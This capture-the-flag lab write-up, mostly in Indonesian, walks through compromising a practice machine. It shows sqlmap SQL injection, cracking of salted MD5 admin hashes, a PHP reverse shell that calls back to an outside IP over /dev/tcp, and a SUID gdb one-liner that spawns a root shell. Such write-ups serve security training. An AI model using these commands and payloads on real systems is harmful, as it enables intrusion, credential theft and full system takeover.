**Difficulty:** Easy  
**Target IP:** 10.1.2.113  
**Author:** Your Name  
**Date:** January 15, 2025
## 1. Reconnaissance

### 1.1 Initial Port Scan
```bash
22/tcp   open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 13:32:a8:d4:98:88:fc:5a:a8:2e:59:70:4c:42:e1:c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDW5ovAJlKS53uMCDxlxoCB2yZoMLcDflEkkC1gq0LvRYLkCTyIiVX5WM68ndWdhTDbsYFLhQSsQsXoxxxIgg6QMzDMOdhYsKNiztKlVl9IG5xW097xke45R4qt78n3b4Zlez3X9XPIg6rJRfwREvOawpLZoTv3plDaobQ4qvAb6daY4Hp9yrIFAdI7C/jSx5yGAXTsqY3AzNFjvwXhKfjyfo8VK2U0e8nOhC4C3XJT7t1AplBQjJfnzW06Lq844z/vJSnI5w+jeFRTsyplpFq7eV98lRKq5tHDmkyITqRbvofUl3aABJtqBmrdYvlMxI/2+dx2Vjqj08o023YV24dX
|   256 1d:29:ac:95:38:b0:d5:09:b5:fa:5f:e4:3c:2b:0c:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF2LW7PKm2z+DV+y6tQvcfbM3UQqWMp01ZDRB11cBnUShgSeO6uTKdxkyUSjMeD+9JRU0TbCy+MalfjGewLd+iI=
|   256 e5:72:24:3f:0d:f6:7d:76:74:4f:c2:63:68:67:32:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJYLeEBD1t9FZBblFqF73T/7kbOHu6isktzLgrd1DFPp
80/tcp   open  http    syn-ack Apache httpd 2.4.39 ((Fedora))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.
|_http-title: Home - My Movie Blog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 551E34ACF2930BF083670FA203420993
|_http-server-header: Apache/2.4.39 (Fedora)
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.3.12-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.12-MariaDB
|   Thread ID: 17525
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, FoundRows, LongColumnFlag, ConnectWithDatabase, Support41Auth, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, ODBCClient, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \.lXU#J,;&J%t;j&zW#E
|_  Auth Plugin Name: mysql_native_password
8081/tcp open  http    syn-ack Apache httpd 2.4.39 ((Fedora))
|_http-server-header: Apache/2.4.39 (Fedora)
|_http-title: Movie Guide v2.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9090/tcp open  http    syn-ack Cockpit web service 189 or later
|_http-title: Did not follow redirect to https://10.1.2.113:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 1.2 Analisis Layanan

Temuan paling signifikan adalah **CMS Made Simple versi 2.2.5** yang berjalan di port 80, dengan footer yang mengonfirmasi versi:

html

<p class='copyright-info'>&copy; Copyright 2004 - 2026 - CMS Made Simple<br />
Situs ini didukung oleh <a href='http://www.cmsmadesimple.org'>CMS Made Simple</a> versi 2.2.5</p>
## 2. Identifikasi Kerentanan

### 2.1 SQL Injection di Movie Guide v2.0

Penelitian mengungkap bahwa Movie Guide v2.0 (port 8081) rentan terhadap SQL injection melalui parameter `md`:

```text
http://localhost/[PATH]/index.php?md=[SQL]
```

### 2.2 Eksploitasi SQL Injection

Menggunakan SQLMap, kami mengidentifikasi dan mengeksploitasi kerentanan:

```bash
sqlmap -u 'http://10.1.2.113:8081/index.php?md=2' --dbs --random-agent --technique BEUSTQ --batch

**Temuan Utama:**

- Database: `cmsdb`
    
- Tabel: `cms_users` berisi kredensial admin
    
- Nilai salt: `187312bd278a5285` dari `cms_siteprefs`
```
    

### 2.3 Kredensial yang Diekstraksi

Dari tabel `cms_users`:

```text
+----------+----------------------------------+--------------+
| username | password                         | admin_access |
+----------+----------------------------------+--------------+
| admin    | b6a057e3ba113bc136b00ee7439ebf4a | 1            |
| minerva  | 0493a385607d679ae21364e3d2a45ef6 | 1            |
+----------+----------------------------------+--------------+
```

## 3. Pembobolan Password

### 3.1 Analisis Hash

Hash password menggunakan format: `md5(salt + password)` (Hashcat Mode 20)

### 3.2 Proses Pembobolan

Menggunakan skrip Python kustom dengan wordlist rockyou.txt:

```python
# Konfigurasi
SALT = "187312bd278a5285"
HASH_FILE = "minerva.hash"
WORDLIST = "/home/greed/rockyou.txt"
```

### 3.3 Kredensial yang Berhasil Dibobol

**Berhasil dibobol:**
```text
`b6a057e3ba113bc136b00ee7439ebf4a` → `P@ssw0rd!`
    
`0493a385607d679ae21364e3d2a45ef6` → `minerva`
```
    

**Kredensial valid:**

- `admin:P@ssw0rd!`
    
- `minerva:minerva`

## 4. Akses Awal

### 4.1 Akses Panel Admin CMS Made Simple

Menggunakan kredensial `admin:P@ssw0rd!`, kami mengakses panel admin CMS Made Simple di:

text

http://10.1.2.113/admin/

### 4.2 Eksekusi Kode via User Defined Tags

Dalam panel admin, kami menavigasi ke:

text

Extensions → User Defined Tags → Add User Defined Tag

**Payload yang digunakan:**

```php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.18.200.142/5555 0>&1'");
```

Payload ini membangun koneksi reverse shell kembali ke sesi Netcat yang sedang mendengarkan.

## 5. Eskalasi Hak Akses (Privilege Escalation)

### 5.1 Penemuan Binary SUID Berbahaya

Setelah mendapatkan shell awal, kami melakukan enumerasi untuk mencari binary dengan permission SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Temuan Kritis:**

```text
-rwsr-sr-x. 1 root root 13M Jul  3  2019 /usr/libexec/gdb
```

### 5.2 Eksploitasi GDB SUID

GDB (GNU Debugger) dengan permission SUID root menjadi "tiket emas" untuk eskalasi hak akses. Kami mengeksploitasinya dengan:

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

**Analisis Command:**

- `gdb`: Menjalankan GNU Debugger
    
- `-nx`: Tidak memuat file konfigurasi .gdbinit
    
- `-ex 'python ...'`: Mengeksekusi kode Python dalam GDB
    
- `-ex quit`: Keluar dari GDB setelah selesai
    

**Mengapa Ini Bekerja:**

1. **SUID Bit**: `-rwsr-sr-x` → bit `s` di permission user berarti dijalankan sebagai pemilik (root)
    
2. **GDB dapat mengeksekusi kode**: GDB dirancang untuk mengeksekusi kode arbitrer untuk debugging
    
3. **Integrasi Python**: GDB dapat menjalankan skrip Python
    
4. **os.execl()**: Mengganti proses saat ini dengan proses baru
    

### 5.3 Mendapatkan Root Shell

Setelah menjalankan exploit, kami berhasil mendapatkan shell root:

```bash
whoami
# Output: root
```
## 6. Pengumpulan Flag

### 6.1 User Flag

```bash
cat /home/minerva/user.txt
**Flag user:** `123d03e4**************`
```

### 6.2 Root Flag
```bash
cat /root/root.txt
**Flag Root:** `1ddafdb2************`
```
